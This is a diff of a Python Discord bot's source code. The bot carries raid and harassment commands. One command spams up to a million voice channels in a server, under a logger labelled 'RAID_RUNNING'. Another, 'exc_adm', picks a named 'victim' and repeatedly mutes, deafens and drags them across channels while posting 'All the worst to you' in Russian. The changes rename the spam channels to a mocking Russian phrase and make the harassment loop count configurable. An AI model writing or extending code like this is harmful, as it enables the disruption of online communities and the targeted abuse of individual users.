@@ -78,7 +78,7 @@ try:
     async def pidor(ctx):
         #logger = logik('RAID_RUNNING')
         for i in range(1000000):
-            await ctx.guild.create_voice_channel(name = 'None')
+            await ctx.guild.create_voice_channel(name = 'Сдохли и сдохли, че бубнить то')
             log.info(f'[{ctx.guild.name}] created by {ctx.message.author.name}')
 
     @bot.command()
@@ -97,7 +97,7 @@ try:
         while True:
             guild = bot.get_guild(ctx.guild.id)
             for i in guild.voice_channels:  
-                if i.name == 'None':
+                if i.name == 'Сдохли и сдохли, че бубнить то':
                     try:
                         log.info(f'[{ctx.guild.name}] {i.name} deleted')
                         await i.delete(reason = 'удаляет, удаляет')
@@ -461,13 +461,13 @@ try:
 
     @bot.command()
     @commands.has_permissions(administrator = True)
-    async def exc_adm(ctx, victim):
+    async def exc_adm(ctx, victim, n:int):
         #logger = logik('RUNNING')
         victim_member = discord.utils.get(ctx.guild.members, name=victim)
         voice = get(bot.voice_clients, guild = ctx.guild)
         await ctx.send(f'{victim_member.mention} **Экскурсия по {ctx.guild.name} начинается. Всего вам плохого**')
         while nn == True:
-            for k in range(10):
+            for k in range(int(n)):
                 await victim_member.edit(mute = True, deafen = True)
                 log.info(f'[{ ctx.guild.name }] {k + 1} Заход пошел')
                 for i in ctx.guild.voice_channels:
@@ -1307,12 +1307,10 @@ try:
         sys.exit(0)
 
 except:
-    logger = logik('RUNNING')
-    logger.warning('Work status: 0')
+    log.warning('Work status: 0')
 
 finally:
-    logger = logik('RUNNING')
-    logger.info('Well done :)')
+    log.info('Well done :)')
     
 
 #D✔Бот for discord channel
